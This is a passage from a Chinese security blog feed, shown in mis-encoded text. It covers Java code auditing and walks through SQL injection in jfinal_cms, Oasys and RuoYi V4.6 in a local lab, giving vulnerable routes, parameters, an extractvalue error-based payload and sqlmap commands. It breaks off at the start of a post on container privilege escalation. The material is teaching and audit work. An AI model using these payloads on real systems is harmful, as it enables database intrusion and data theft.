ä½œä¸ºè¯­ä¹‰æå–å·¥å…·ï¼Œå°†JAR&#x2F;WAR&#x2F;CLASSæ–‡ä»¶è½¬åŒ–ä¸ºä»£ç å±æ€§å›¾ï¼Œå¹¶ä½¿ç”¨ Neo4j å›¾æ•°æ®åº“æ¥å­˜å‚¨ç”Ÿæˆçš„ä»£ç å±æ€§å›¾CPGã€‚</p><p>14.SpringInspectorï¼šJavaè‡ªåŠ¨ä»£ç å®¡è®¡å·¥å…·ï¼Œå°¤å…¶é’ˆå¯¹Springæ¡†æ¶ï¼Œæä¾›ä¸€ä¸ªSpringBootçš„JaråŒ…å³å¯è¿›è¡Œè‡ªåŠ¨ä»£ç å®¡è®¡ï¼Œåº•å±‚æŠ€æœ¯åŸºäºå­—èŠ‚ç åˆ†æã€‚</p><p>15.gadgetinspectorï¼šååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ã€æ¼æ´æ£€æµ‹å·¥å…·ã€‚</p><p>å¼€å‘å®¡è®¡å…¥å£å¸¸è§æ–¹æ³•ï¼š</p><p>-æœç´¢æ³•ï¼šå¸¸è§„æˆ–éƒ¨åˆ†MVCæ¨¡å‹æºç å¯ä»¥é‡‡ç”¨å…³é”®å­—çš„æœç´¢æŒ–æ˜æ€è·¯</p><p>-åŠŸèƒ½æ³•ï¼šæ¡†æ¶MVCæ¨¡å‹æºç ä¸€èˆ¬ä¼šé‡‡ç”¨åŠŸèƒ½ç‚¹åˆ†ææŠ“åŒ…è¿½è¸ªæŒ–æ˜æ€è·¯</p><p>-å¯¹æ¯”æ³•ï¼šå¯ä»¥é€šè¿‡å‰åä¿®å¤ç‰ˆæœ¬æ–‡ä»¶åŠä»£ç ä¸åŒç‰¹å¾è¿›è¡Œé’ˆå¯¹æŒ–æ˜æ€è·¯</p><p>-ç‰¹å¾æ³•ï¼šæ•°æ®åº“ç›‘æ§æŒ–SQLæ³¨å…¥ï¼Œæ–‡ä»¶ç›‘æ§æŒ–ä¸Šä¼ åˆ é™¤å†™å…¥ç­‰ï¼Œåç»­è¡¥å……</p><p>-è°ƒè¯•æ³•ï¼šåŠ¨æ€è°ƒè¯•ï¼ˆPHP,ASP.NET,JavaEE,Pythonç­‰ï¼‰</p><p>-å·¥å…·æ³•ï¼šåç»­è®²åˆ°ï¼ˆDAST&amp;SAST&amp;IAST&amp;CodeQLç­‰ï¼‰</p><table><thead><tr><th align="center">ç±»åˆ«</th><th align="center">æµ‹è¯•é¡¹</th></tr></thead><tbody><tr><td align="center">è®¤è¯é‰´æƒ</td><td align="center">ç™»å½•å¯†ç æ˜¯å¦åŠ å¯†</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å¯çŒœè§£ç”¨æˆ·å</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å¯æ‰¹é‡æ³¨å†Œç”¨æˆ·</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨éªŒè¯ç </td></tr><tr><td align="center"></td><td align="center">éªŒè¯ç æœ‰æ•ˆæ€§</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦ç™»å½•ä¼šè¯å›ºå®š</td></tr><tr><td align="center"></td><td align="center">ä¼šè¯IDæ˜¯å¦è¶³å¤Ÿå¤æ‚</td></tr><tr><td align="center"></td><td align="center">æ³¨é”€åŠŸèƒ½æ˜¯å¦æœ‰æ•ˆ</td></tr><tr><td align="center"></td><td align="center">ç™»å½•èº«ä»½æ ¡éªŒç®—æ³•æ˜¯å¦å¯é€†</td></tr><tr><td align="center"></td><td align="center">ä¿®æ”¹å¯†ç å¤„æ˜¯å¦éªŒè¯æ—§å¯†ç </td></tr><tr><td align="center"></td><td align="center">Cookieä¸­æ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯</td></tr><tr><td align="center">ä¿¡æ¯æ³„éœ²</td><td align="center">æ˜¯å¦å­˜åœ¨ä¸­é—´ä»¶é”™è¯¯é¡µé¢</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦æš´éœ²å¼‚å¸¸å¤„ç†æŠ¥é”™ä¿¡æ¯</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨æºä»£ç æ³„éœ²</td></tr><tr><td align="center"></td><td align="center">æºä»£ç æ³¨é‡Šä¿¡æ¯</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ˜æ–‡ä¼ è¾“</td></tr><tr><td align="center">æ–‡ä»¶I&#x2F;O</td><td align="center">æ˜¯å¦å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</td></tr><tr><td align="center">æ•°æ®éªŒè¯</td><td align="center">æ˜¯å¦å­˜åœ¨åå°„å‹XSS</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨å­˜å‚¨å‹XSS</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨DOMå‹çš„XSS</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨URLè·³è½¬æ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦httpå¤´CRLFæ³¨å…¥</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨SSRFæ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨è·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´</td></tr><tr><td align="center">é€»è¾‘æµç¨‹</td><td align="center">æ˜¯å¦å­˜åœ¨æ¨ªå‘è¶Šæƒ</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨å‚ç›´è¶Šæƒ</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨é€»è¾‘ç»•è¿‡</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®</td></tr><tr><td align="center">ç»„ä»¶å®‰å…¨</td><td align="center">æ˜¯å¦å­˜åœ¨ä¸­é—´ä»¶ç»„ä»¶æ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å¼€å‘ç»„ä»¶æ¼æ´</td></tr><tr><td align="center">æ¥å£å®‰å…¨</td><td align="center">æ˜¯å¦å­˜åœ¨çŸ­ä¿¡ç‚¸å¼¹æ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨é‚®ä»¶ç‚¸å¼¹æ¼æ´</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨å¾®ä¿¡æ¨é€ç‚¸å¼¹æ¼æ´</td></tr><tr><td align="center">å…¶ä»–</td><td align="center">æ˜¯å¦å­˜åœ¨å±é™©çš„HTTPæ–¹æ³•</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦CORSé…ç½®ä¸å½“</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦èƒ½å­˜åœ¨HOSTæ”»å‡»</td></tr><tr><td align="center"></td><td align="center">æ˜¯å¦å­˜åœ¨æ¥å£è¯·æ±‚æœªé‰´æƒ</td></tr></tbody></table><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><p>1ã€ä¸‰ä¸ªæ¨¡å¼ï¼š</p><p>JDBCï¼ŒMybatisï¼ŒHibernateåˆç§°HQL</p><p>2ã€å‡ºç°æ³¨å…¥ï¼š</p><p> åŸç”ŸJDBCæ˜¯å¦å­˜åœ¨ç›´æ¥æ‹¼æ¥SQLè¯­å¥ï¼ˆä½¿ç”¨+ï¼Œæˆ–è€…ä½¿ç”¨StringBUilderappend()ï¼‰ï¼Œæœªç»è¿‡é¢„ç¼–è¯‘ï¼›</p><p>Mybatisä½¿ç”¨${}ï¼›</p><p>Hibernateã€JPAé»˜è®¤æ˜¯ç»è¿‡é¢„ç¼–è¯‘çš„ï¼Œä½†æ˜¯å¦‚æœå¼€å‘è‡ªå·±ç¼–å†™çš„SQLè¯­å¥ï¼Œä¹Ÿéœ€è¦è¿›è¡Œæ£€æŸ¥ï¼›</p><p>Javaæ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œå½“æ³¨å…¥å‚æ•°ä¸ºlongã€intç­‰æ•°å­—ç±»å‹æ—¶æ— æ³•è¿›è¡Œæ³¨å…¥ï¼›</p><p>æ‰¾åˆ°å±é™©å‡½æ•°ä½ç½®ä¹‹åï¼Œå‘ä¸Šæœç´¢ï¼Œæ‰¾å‡½æ•°ã€æ–¹æ³•è°ƒç”¨ä½ç½®ï¼Œç›´åˆ°è¯·æ±‚å…¥å£ï¼ˆcontrollerå±‚ï¼‰ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ— å®³åŒ–å¤„ç†ã€æ— å®³åŒ–å¤„ç†æ˜¯å¦ä¸¥æ ¼ï¼›</p><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw</a></p><p>3ã€åˆ¤æ–­æ¨¡å¼ï¼š</p><p>-çœ‹é¡¹ç›®è¯´æ˜ä½¿ç”¨çš„æŠ€æœ¯æ¡†æ¶</p><p>-çœ‹å¼•ç”¨ä¸­åŠ è½½é‚£äº›æŠ€æœ¯æ¡†æ¶</p><p>-çœ‹é…ç½®æºç ä¸­ç›¸å…³é…ç½®æ–‡ä»¶</p><p>Mybatiså–œæ¬¢ç”¨xmlé…ç½®æ–‡ä»¶æ¥å®šä¹‰sqlè¯­å¥ï¼Œå…·ä½“å¯ä»¥å‚è€ƒä¸Šé¢çš„é“¾æ¥</p><p>4ã€å…¥å£ç¡®å®š:</p><p>1ã€æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘æŠ€æœ¯ï¼Œé¢„ç¼–è¯‘æ˜¯å¦å®Œæ•´ã€‚</p><p>2ã€å®šä½SQLè¯­å¥ä¸Šä¸‹æ–‡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å‚æ•°ç›´æ¥æ‹¼æ¥ï¼Œæ˜¯å¦æœ‰å¯¹æ¨¡ç³ŠæŸ¥è¯¢å…³é”®å­—çš„è¿‡æ»¤ã€‚</p><p>3ã€Mybatisæ¡†æ¶åˆ™æœç´¢${}ï¼Œå››ç§æƒ…å†µæ— æ³•é¢„ç¼–è¯‘ï¼šlikeæ¨¡ç³ŠæŸ¥è¯¢ã€order byæ’åºã€èŒƒå›´æŸ¥è¯¢inã€åŠ¨æ€è¡¨å&#x2F;åˆ—åï¼Œåªèƒ½æ‹¼æ¥ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦æ‰‹å·¥é˜²æ³¨å…¥ï¼Œæ­¤æ—¶å¯æŸ¥çœ‹ç›¸å…³é€»è¾‘æ˜¯å¦æ­£ç¡®ã€‚</p><p>4ã€JPAæœç´¢JpaSort.unsafe()ï¼ŒæŸ¥çœ‹æ˜¯å¦ç”¨å®ä½“ä¹‹å¤–çš„å­—æ®µå¯¹æŸ¥è¯¢ç»“æœæ’åºï¼Œè¿›è¡Œäº†SQLçš„æ‹¼æ¥ã€‚ä»¥åŠæŸ¥çœ‹EntityManagerçš„ä½¿ç”¨ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨æ‹¼æ¥SQLçš„æƒ…å†µã€‚</p><p>Statement</p><p>createStatement</p><p>PrepareStatement</p><p>like â€˜%${</p><p>in(${</p><p>in (${</p><p>select</p><p>update</p><p>insert</p><p>delete</p><p>${</p><p>order by</p><p>setObject(</p><p>setInt(</p><p>setString(</p><p>setSQLXML(</p><p>createQuery(</p><p>createSQLQuery(</p><p>createNativeQuery</p><p>â€¦â€¦.</p><h2 id="éæ¡†æ¶JDBC-Jfinal-cmsè®ºå›ç³»ç»Ÿ"><a href="#éæ¡†æ¶JDBC-Jfinal-cmsè®ºå›ç³»ç»Ÿ" class="headerlink" title="éæ¡†æ¶JDBC-Jfinal_cmsè®ºå›ç³»ç»Ÿ"></a>éæ¡†æ¶JDBC-Jfinal_cmsè®ºå›ç³»ç»Ÿ</h2><p><a href="https://github.com/jflyfox/jfinal_cms">https://github.com/jflyfox/jfinal_cms</a></p><p>åˆ†æï¼šç¡®å®šéæ¡†æ¶ï¼ˆçœ‹meavenåº“å‘ç°æ²¡æœ‰Mybatisï¼ŒHibernateï¼‰-&gt;æœå…³é”®å­—order by append-&gt;getBaseForm()-&gt;getOrderBy()-&gt;getOrderColumn-&gt;orderColumn</p><p>è·¯ç”±ï¼šPost:&#x2F;admin&#x2F;advicefeedback&#x2F;list</p><p>å‚æ•°ï¼šform.orderColumn</p><p>æ‹¼æ¥ï¼šorder by â€œ).append(orderBy);</p><p>Pocï¼šâ€™ xxx #(ç›´æ¥sqlmapæœå“ˆ)</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892315037-fafee04b-722a-4967-b3df-9e330e6e91e6.png"></p><p>è·Ÿè¿›å»çœ‹orderByå˜é‡æ˜¯å¦å¯æ§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892475812-b9a9fac6-a41a-432b-b42f-d2e02a1cd2d6.png"></p><p>æ¥ç€è·Ÿä¸¤ä¸ªå‡½æ•°</p><p>getBaseForm()-&gt;getOrderBy()-&gt;getOrderColumn-&gt;orderColumn</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892640873-58fdc5ca-b9e8-4090-8367-84eda3048af6.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718892744038-65906285-ba21-415c-9572-d42d9aa0b9c3.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718893051410-20938fcf-a290-4630-b063-2d2c31164352.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718893082232-04f6ffd8-1199-46e2-a6a7-736844f21d33.png"></p><p>è·¯ç”±ï¼šPost:&#x2F;admin&#x2F;advicefeedback&#x2F;list</p><p>å‚æ•°ï¼šform.orderColumn </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718893544735-9cea2452-9f4f-4fbc-812e-5e677df03ddc.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tb_advice_feedback t where <span class="number">1</span>=<span class="number">1</span> order by orderBy</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ï¼šorder by â€œ).append(orderBy);</p><p>Pocï¼šâ€™ xxx #(ç›´æ¥sqlmapæœå“ˆ)</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718894011179-873efa15-d6a8-4d76-9711-f9f717431ce4.png"> burpå¼€å¯åï¼Œéšä¾¿ç‚¹ä¸€ä¸‹è§¦å‘ï¼ŒæŠ“åŒ…æ—¶ä¸è¦ç”¨localhostæˆ–è€…127.ä¼šæŠ“ä¸å…¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718896381918-46159c1a-9629-4c03-8212-74fb63dd020a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718896451394-74fc8133-1477-478f-aaed-c20e126944f7.png"></p><p>python3.exe sqlmap.py -r ifcms.txt</p><p>æ¢­å“ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718897493345-89469dbd-be2d-470e-a6e1-b6413ddfac5c.png"></p><h2 id="SpringBoot-Mybatis-OasysåŠå…¬ç³»ç»Ÿ"><a href="#SpringBoot-Mybatis-OasysåŠå…¬ç³»ç»Ÿ" class="headerlink" title="SpringBoot+Mybatis-OasysåŠå…¬ç³»ç»Ÿ"></a>SpringBoot+Mybatis-OasysåŠå…¬ç³»ç»Ÿ</h2><p><a href="https://gitee.com/aaluoxiang/oa_system">https://gitee.com/aaluoxiang/oa_system</a></p><p>åˆ†æï¼šç¡®å®šMybatisæ¡†æ¶-&gt;æœå…³é”®å­—${-&gt;%${baseKey}%-&gt;sortMyNotice-&gt;sortMyNotice-&gt;informListPaging-&gt;</p><p>è·¯ç”±ï¼šPost:&#x2F;informlistpaging</p><p>å‚æ•°ï¼šbaseKey</p><p>æ‹¼æ¥ï¼šand n.title LIKE â€˜%${baseKey}%â€™</p><p>Pocï¼šâ€™ xxx #(ç›´æ¥sqlmapæœå“ˆ)</p><p>çœ‹pomæ–‡ä»¶æœ‰mybatisåº“ç¡®è®¤ä¸ºMybatisæ¡†æ¶</p><p>åœ¨xmlæ–‡ä»¶ä¸­æœ%${</p><p>ä»‹ç»ä¸ªæ’ä»¶ï¼Œç‚¹å‡»å°é¸Ÿå›¾æ ‡å¯ä»¥ç›´æ¥è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981243781-c0b03fec-80f6-45cd-a7e6-4a7051852c11.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981286518-a978400e-6f00-4a95-8bda-5e4ab765e039.png"></p><p>å³é”®ï¼Œè½¬åˆ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981404667-7c2e3af4-7b86-42f2-8aa1-9b2ca0af9bb4.png"></p><p>å†çœ‹ä¸€ä¸‹è·¯ç”±åœ°å€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981495059-d0aaf84c-11a7-4e7c-bd5f-932862df1e6a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718981515613-a75d7fc1-c9a5-4aca-862c-c76ad19083ed.png"></p><p>æŒ‰ç…§è¯´æ˜ä¹¦é…ç½®application.properties</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982202019-1ccb2354-a692-4ae2-81f9-b60098dc922a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982343393-8cbb437d-2767-4826-a01d-1fdf3112e761.png"></p><p>æŠ“åŒ…</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982403861-bc5640f6-f66a-4655-933a-a1188d51de27.png"></p><p>æŠŠ127.0.0.1æ¢æˆ<a href="http://10.211.55.3/">http://10.211.55.3/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982606106-5c6fe712-d420-4275-b95b-0b2d34e92f71.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982709936-427de715-cb96-4714-9bf8-53a7cabb519b.png"></p><p>æ¢­å“ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718982839730-a75a2e97-40a2-497f-a7fa-3cd1399dbd6f.png"></p><h2 id="SpringBoot-Mybatis-Ruoyiè‹¥ä¾ç³»ç»Ÿ-V4-6"><a href="#SpringBoot-Mybatis-Ruoyiè‹¥ä¾ç³»ç»Ÿ-V4-6" class="headerlink" title="SpringBoot+Mybatis-Ruoyiè‹¥ä¾ç³»ç»Ÿ V4.6"></a>SpringBoot+Mybatis-Ruoyiè‹¥ä¾ç³»ç»Ÿ V4.6</h2><p><a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project/RuoYi</a></p><p>åŸºäºspringbootä¸­ï¼Œæ‰§è¡ŒSQLä¸‰ä¸ªè°ƒç”¨ï¼š</p><p>1ã€ä¸šåŠ¡å±‚è°ƒç”¨daoå±‚</p><p>2ã€controllerè°ƒç”¨Serviceå±‚é—´æ¥è°ƒç”¨daoå±‚</p><p>3ã€controllerç›´æ¥è°ƒç”¨daoå±‚</p><p>åˆ†æï¼šç¡®å®šMybatisæ¡†æ¶-&gt;æœå…³é”®å­—${-&gt;updateDeptStatus-&gt;updateParentDeptStatus-&gt;updateDept-&gt;editSave</p><p>è·¯ç”±ï¼šPost:&#x2F;system&#x2F;dept&#x2F;edit</p><p>å‚æ•°ï¼šancestors</p><p>æ‹¼æ¥ï¼šwhere dept_id in (${ancestors})</p><p>Pocï¼šDeptName&#x3D;1&amp;DeptId&#x3D;100&amp;ParentId&#x3D;12&amp;Status&#x3D;0&amp;OrderNum&#x3D;1&amp;ancestors&#x3D;0)or(extractvalue(1,concat((select user()))));#</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986279673-4e4406ce-ce0d-46cd-afba-1760b2baba35.png"></p><p>è·Ÿè¿›å»ï¼Œçœ‹åˆ°æœ€ä¸Šé¢æ²¡æœ‰è·¯ç”±ï¼Œå†è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986327535-60aa1522-c5af-45f0-bcfd-b73f72839c63.png"></p><p>å†å¾€ä¸Šæ‰¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986449204-4c5031bb-4067-488e-bbf2-82e10335a582.png"></p><p>å†å¾€ä¸Šè·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986489399-8b618f9a-5d83-4f05-aeec-c6cbc122eae2.png"></p><p>è·Ÿåˆ°controllerï¼Œæœ€ä¸Šé¢æœ‰è·¯ç”±åœ°å€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986618834-e0df9760-667c-45f9-b158-05112654a9ea.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718986571868-8f3ac22e-c6d0-4164-835a-70ffa342b3db.png"></p><p>åˆ†æ</p><p>è·¯ç”±ï¼šPost:&#x2F;system&#x2F;dept&#x2F;edit</p><p>ç›´æ¥è®¿é—®æ— æ³•è§¦å‘ï¼Œæ ¹æ®æºç é‡Œé¢çš„ä¸­æ–‡ä¿¡æ¯ï¼Œè·Ÿéšé¡µé¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718987086221-332f5a05-8b56-4b48-83a5-39a4696c193c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718987132612-d2700d09-5e7b-4804-ad43-9cf8f8dba1fb.png"></p><p>ä¿®æ”¹æœ€ä¸‹é¢çš„ä¿¡æ¯</p><p>å‚æ•°ï¼šancestors</p><p>æ‹¼æ¥ï¼šwhere dept_id in (${ancestors})</p><p>Pocï¼šDeptName&#x3D;1&amp;DeptId&#x3D;100&amp;ParentId&#x3D;12&amp;Status&#x3D;0&amp;OrderNum&#x3D;1&amp;ancestors&#x3D;0)or(extractvalue(1,concat((select user()))));#</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1718987175889-de4d33a8-43af-4d09-a987-e4fedc0afe3d.png"></p><p>ä¹Ÿå¯ä»¥sqlmapä¸€æŠŠæ¢­å“ˆ</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®¹å™¨&amp;åŸŸæ§æƒé™æå‡</title>
      <link href="/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="å®¹å™¨"><a href="#å®¹å™¨" class="headerlink" title="å®¹å™¨"></a>å®¹å™¨</h1><p>LXDã€LXC å’Œ Docker æ˜¯ä¸‰ç§ä¸åŒçš„å®¹å™¨åŒ–æŠ€æœ¯ï¼Œå®ƒä»¬åœ¨å®ç°å’Œä½¿ç”¨ä¸Šæœ‰ä¸€äº›åŒºåˆ«ã€‚</p><p>æ€»ç»“æ¥è¯´ï¼ŒLXDæ˜¯åŸºäºLXCçš„ç³»ç»Ÿçº§å®¹å™¨ç®¡ç†å™¨ï¼Œæä¾›äº†æ›´é«˜çº§åˆ«çš„æ¥å£å’Œç®¡ç†å·¥å…·ï¼›LXCæ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå…è®¸åœ¨å•ä¸ªLinuxå†…æ ¸ä¸Šè¿è¡Œå¤šä¸ªéš”ç¦»çš„ç”¨æˆ·ç©ºé—´å®ä¾‹ï¼›è€ŒDockeræ˜¯åŸºäºLXCçš„å®¹å™¨åŒ–å¹³å°ï¼Œæä¾›äº†ä¸€å¥—ç®€åŒ–å®¹å™¨æ„å»ºã€åˆ†å‘å’Œè¿è¡Œçš„å·¥å…·å’ŒAPIã€‚</p><p>LXDï¼ˆLinuxå®¹å™¨å®ˆæŠ¤ç¨‹åºï¼‰æ˜¯ä¸€ä¸ªç³»ç»Ÿçº§å®¹å™¨ç®¡ç†å™¨ï¼Œå®ƒåŸºäºLXCï¼ˆLinuxå®¹å™¨ï¼‰æŠ€æœ¯ã€‚LXDæä¾›äº†æ›´é«˜çº§åˆ«çš„æ¥å£å’Œç®¡ç†å·¥å…·ï¼Œä½¿å¾—è½»æ¾åˆ›å»ºå’Œç®¡ç†ç³»ç»Ÿå®¹å™¨æˆä¸ºå¯èƒ½ã€‚LXDä¸»è¦é¢å‘ç³»ç»Ÿçº§å®¹å™¨ï¼Œå¯ä»¥è¿è¡Œå®Œæ•´çš„æ“ä½œç³»ç»Ÿé•œåƒï¼Œå¹¶æä¾›ç±»ä¼¼äºè™šæ‹Ÿæœºçš„ç¯å¢ƒã€‚å®ƒæä¾›äº†æ›´å¥½çš„éš”ç¦»æ€§ã€èµ„æºæ§åˆ¶å’Œå®‰å…¨æ€§ã€‚</p><p>LXCï¼ˆLinuxå®¹å™¨ï¼‰æ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒå…è®¸åœ¨å•ä¸ªLinuxå†…æ ¸ä¸Šè¿è¡Œå¤šä¸ªéš”ç¦»çš„ç”¨æˆ·ç©ºé—´å®ä¾‹ã€‚LXCæä¾›äº†ä¸€ç»„å·¥å…·å’ŒAPIï¼Œç”¨äºåˆ›å»ºå’Œç®¡ç†å®¹å™¨ã€‚LXCå®¹å™¨é€šå¸¸æ¯”LXDå®¹å™¨æ›´åŠ çµæ´»å’Œè½»é‡çº§ï¼Œå¯ä»¥å®šåˆ¶åº•å±‚æ“ä½œç³»ç»Ÿçš„å„ä¸ªæ–¹é¢ã€‚LXCæ›´é€‚åˆäºéœ€è¦æ›´ç»†ç²’åº¦æ§åˆ¶çš„ä½¿ç”¨åœºæ™¯ã€‚</p><p>Dockeræ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨åŒ–å¹³å°ï¼Œå®ƒå»ºç«‹åœ¨LXCä¹‹ä¸Šï¼Œå¹¶æä¾›äº†ä¸€å¥—æ›´é«˜çº§åˆ«çš„å·¥å…·å’ŒAPIï¼Œä½¿å¾—å®¹å™¨çš„æ„å»ºã€åˆ†å‘å’Œè¿è¡Œå˜å¾—æ›´åŠ ç®€å•ã€‚Dockeræä¾›äº†ä¸€ä¸ªå®¹å™¨é•œåƒçš„é›†è£…ç®±æ¨¡å‹ï¼Œä½¿å¾—å®¹å™¨å¯ä»¥åœ¨ä¸åŒçš„ç¯å¢ƒä¸­è¿›è¡Œç§»æ¤å’Œéƒ¨ç½²ã€‚Dockerå¼ºè°ƒå®¹å™¨çš„å¯ç§»æ¤æ€§å’Œæ˜“ç”¨æ€§ï¼Œé€‚ç”¨äºå¼€å‘ã€æµ‹è¯•å’Œéƒ¨ç½²åº”ç”¨ç¨‹åºçš„åœºæ™¯ã€‚</p><p>#åˆ©ç”¨å‚è€ƒï¼šï¼ˆSUID&amp;SUDO&amp;capabilityï¼‰</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>ä¸¤ç§æƒ…å†µï¼š</p><p>æƒé™åœ¨dockerï¼š</p><p>é€ƒé€¸ ææƒï¼ˆå®¿ä¸»æœºï¼‰</p><p>æƒé™ä¸åœ¨dockerï¼š</p><p>å€ŸåŠ©dockeråº”ç”¨å»ææƒï¼ˆç”¨æˆ·å½’å±æ˜¯dockerç»„ æ‹‰é•œåƒ 